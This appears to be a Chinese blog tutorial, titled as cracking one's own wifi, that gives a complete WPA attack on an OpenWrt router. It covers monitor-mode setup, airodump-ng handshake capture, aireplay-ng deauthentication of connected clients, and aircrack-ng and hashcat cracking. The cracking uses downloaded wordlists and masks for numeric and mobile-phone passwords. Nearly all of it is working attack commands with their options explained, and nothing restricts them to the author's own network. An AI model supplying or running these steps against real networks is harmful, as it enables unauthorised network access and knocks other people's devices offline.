---
title: Crack
description: Crack
categories:
  - 问题
tags:
  - 日常问题
date: 2026-08-06T09:26:31+08:00
lastmod: 2026-08-06T09:26:31+08:00
cssAttach:
  - book03
cssclasses:
  - book03
---
***学习如何破解自己的wifi（o.O）***

# 这里以安装在路由器上的系统openwrt为例  

## 前提

安装一些软件

```shell
apk update && apk upgrade
apk add lrzsz #在xshell上传下载字典
apk add hcxtools #握手包格式转换
apk add aircrack-ng  #监听扫描
apk add airmon-ng  #貌似不需要这个
```

接下来会新加两个虚拟接口（重启路由器之后会消失）

## 关闭原来的部分接口


```shell
wifi down
```

(也可以不关闭原来的接口 ~~即不 `wifi down`~~ ，直接禁用2.4G的wifi，以及中继的5Gwifi。默认就会直接去扫描5G ~~但是也只能扫描部分信道，不能扫描全部的~~ ，后面也不用特意设置5G频率)
## 添加接口

```shell
#供扫描2.4G wifi用
iw phy phy0 interface add mon24 type monitor
#启用该接口
ip link set mon24 up 
#供扫描5G wifi用
iw phy phy0 interface add mon5 type monitor
#启用该接口
ip link set mon5 up 

#查看是否添加成功
iw dev
```

## 设置频率并扫描


```shell
#设置2.4G wifi
iw dev mon24 set freq 2412 

#设置5G wifi
iw dev mon5 set freq 5180

```

查看一下是否设置成功

```shell
root@AndroidPhone:~# iw dev
phy#0
	Interface mon24
		ifindex 14
		wdev 0x6
		addr cc:2d:53:23:21:2b
		type monitor
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		txpower 29.00 dBm
		Radios: 0 1
	Interface mon5
		ifindex 13
		wdev 0x5
		addr aa:24:22:29:23:2b
		type monitor
		channel 36 (5180 MHz), width: 20 MHz (no HT), center1: 5180 MHz
		txpower 29.00 dBm
		Radios: 0 1

```

根据需要扫描

```shell
#扫描2.4G wifi
#设置2.4G wifi
iw dev mon24 set freq 2412 
airodump-ng --band bg mon24  

#扫描5G wifi
#设置5G wifi
iw dev mon5 set freq 5180
airodump-ng --band a mon5
#扫描之后就还不能打开wifi # wifi up
```

这里记住需要监听的wifi的信道以及ssid


## 选择ssid和信道进行监听



```shell
#监听2.4G频率wifi
#设置2.4G wifi
iw dev mon24 set freq 2412 
airodump-ng   -c 6 --bssid EA:9B:4B:A6:0C:6C -w /root/xx --ignore-negative-one  mon24

#设置5G wifi
iw dev mon5 set freq 5180
#监听5G频率wifi
airodump-ng   -c 153 --bssid 4C:22:66:F1:28:00 -w /root/xx --ignore-negative-one  mon5
```

解释：  
- -c 后面数字表示信道
- --bssid后面表示路由器（或者热点）的mac地址
- -w 后面表示抓的握手包放的位置
- --ignore-negative-one 是忽略并跳过一些错误，否则会显示 xxxxx -1之类的错误

此时如果有客户端连接上，会在下方列表显示（一行一个客户端）

## 新开shell窗口强制断开客户端连接

```shell
#断开连接2.4G wifi的客户端
aireplay-ng -0 5 -c  16:51:FB:CD:2A:2E  -a   3E:41:A0:44:E8:43    --ignore-negative-one    mon24
#断开连接5G wifi的客户端
aireplay-ng -0 5 -c  FC:84:12:05:98:4F   -a  4C:22:66:F1:28:00    --ignore-negative-one    mon5
aireplay-ng -0 5 -c 20:8F:42:22:E2:31   -a  4C:22:66:F1:28:00    --ignore-negative-one    mon5

```

- -c 之后的字符表示连接到该wifi的客户端mac（上面列表中的station）
- -a 表示该wifi路由器（热点）设备的mac

## 打开原来的部分接口

```shell

iw dev mon24 del
iw dev mon5 del
wifi up
#由于占用了原来的信道，除非先把刚才的几个monitor删除了，最省事的是直接重启
#reboot
```

# 字典下载

https://weakpass.com/
推荐以下几个比较小的字典
- ignis-10K.txt
- rockyou-65.txt
- hashmob.net_2025.small.found
# 验证握手包并转换格式

```shell
aircrack-ng xx-02.cap #Encryption出现WPA(1 handshake)
hcxpcapngtool -o output.hc22000 xx-02.cap #这里转换格式是为了方便导出到电脑上使用hashcat

```

# 暴力破解

```shell
#使用aircrack-ng简单跑字典
aircrack-ng -w dict.txt simple-12345628.hc22000
#使用hashcat简单跑字典
hashcat -m 22000 simple-12345628.hc22000 rockyou.txt  --potfile-disable 


#使用hashcat 掩码暴力破解
hashcat -m 22000 output.hc22000 -a 3 '?d?d?d?d?d?d?d?d' --potfile-disable  #8位纯数字
hashcat -m 22000 output.hc22000 -a 3 '?d?d?d?d?d?d?d?d?d?d?d' --potfile-disable  #11位纯数字
hashcat -m 22000 602.hc22000 -a 3 '1[3-9]?d?d?d?d?d?d?d?d?d?d' --potfile-disable #11位手机号
```

